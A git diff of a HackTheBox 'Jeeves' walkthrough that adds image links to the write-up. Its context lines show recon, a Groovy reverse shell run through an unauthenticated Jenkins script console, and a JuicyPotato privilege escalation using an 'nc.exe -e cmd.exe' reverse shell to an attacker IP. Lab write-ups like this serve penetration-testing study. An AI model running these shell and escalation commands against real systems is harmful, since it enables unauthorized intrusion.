@@ -1,19 +1,19 @@
 # Jeeves [htb](https://app.hackthebox.com/machines/114)
 
-![jeeves-01]()
+![jeeves-01](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/jeeves-01.png)
 
 ## Recon
 
 Lets start by adding the target to our `/etc/hosts` file:
 
-![hosts-02]()
+![hosts-02](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/hosts-02.png)
 
 
 Lets scan the target with: 
 
 `nmap -sC -sV -p- -A jeeves.htb -oN nmap.result`
 
-![nmap-res-03]()
+![nmap-res-03](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/nmap-res-03.png)
 
 
 We get the following:
@@ -32,14 +32,14 @@ Lets try connecting with a null session:
 
 `smbclient -U '%' -N \\\\jeeves.htb\\IPC$`
 
-![null-fail-04]()
+![null-fail-04](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/null-fail-04.png)
 
 
 Lets try crackmapexec:
 
 `crackmapexec smb jeeves.htb -u '' -p '' --users`
 
-![crackmap-fail-05]()
+![crackmap-fail-05](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/crackmap-fail-05.png)
 
 
 Looks like we need credentials, lets move on to the IIS server on port 80.
@@ -49,17 +49,17 @@ Looks like we need credentials, lets move on to the IIS server on port 80.
 
 Lets open our browser and navigate towards `http://jeeves.htb/`
 
-![jeeves-site-06]()
+![jeeves-site-06](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/jeeves-site-06.png)
 
 
 If we try to search anything in the search bar, we get redirectred to this `error.html` page:
 
-![err-html-07]()
+![err-html-07](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/err-html-07.png)
 
 
 This is a predetermined outcome no matter what we input:
 
-![source-08]()
+![source-08](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/source-08.png)
 
 
 We can't really interact with the SQL server at the moment, no request is actually being sent 
@@ -78,7 +78,7 @@ Lets check the Jetty server on port 50000.
 
 Lets navigate towards `http://jeeves.htb:50000`
 
-![jetty-site-09]()
+![jetty-site-09](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/jetty-site-09.png)
 
 
 Nothing here. If we try directory busting we find something interesting:
@@ -86,17 +86,17 @@ Nothing here. If we try directory busting we find something interesting:
 `ffuf -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3
 -medium.txt:FUZZ -u http://jeeves.htb:50000/FUZZ`
 
-![ffuf-res-10]()
+![ffuf-res-10](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/ffuf-res-10.png)
 
 
 This leads us to an unauthenticated Jenkins portal:
 
-![jenkins-11]()
+![jenkins-11](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/jenkins-11.png)
 
 
 We could try to login, but why would we if we can access the script console? :
 
-![script-console-12]()
+![script-console-12](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/script-console-12-png.png)
 
 
 We can use the following Groovy reverse shell
@@ -114,12 +114,12 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 + Paste the script to the script console and execute. 
 
-![exec-13]()
+![exec-13](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/exec-13.png)
 
 
 + Get a shell:
 
-![shell-14]()
+![shell-14](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/shell-13.png)
 
 
 
@@ -128,7 +128,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 If we list out our user's privileges with `whoami /priv`:
 
-![priv-15]()
+![priv-15](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/priv-15.png)
 
 
 We can see we have the `SeImpersonate` privilege enabled, this is bad. This means we can try and
@@ -150,26 +150,26 @@ use [juicypotato](https://github.com/ohpe/juicy-potato) to get `NT_AUTHORITY`.
 
 `juicypotato.exe -l 9009 -p C:\windows\system32\cmd.exe -a "/c c:\\Users\kohsuke\nc.exe -e cmd.exe 10.10.14.68 9009" -t *`
 
-![execute-16]()
+![execute-16](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/execute-16.png)
 
 
 + Get `NT_AUTHORITY`:
 
-![root-17]()
+![root-17](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/root-17png.png)
 
 
 If you want the `root.txt` flag, you wont find it in the admin's desktop folder simply with `dir`.
 In CTF's we should always look for alternative data streams, which can be seen with `dir /R`:
 
 
-![altr-strm-18]()
+![altr-strm-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/altr-strm-18.png)
 
 
 To get the contents of the file redirect it to `more` as such:
 
 `more < hm.txt:root.txt`
 
-![root-flag-18]()
+![root-flag-18](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Jeeves/img/root-flag-18.png)
 
 
 
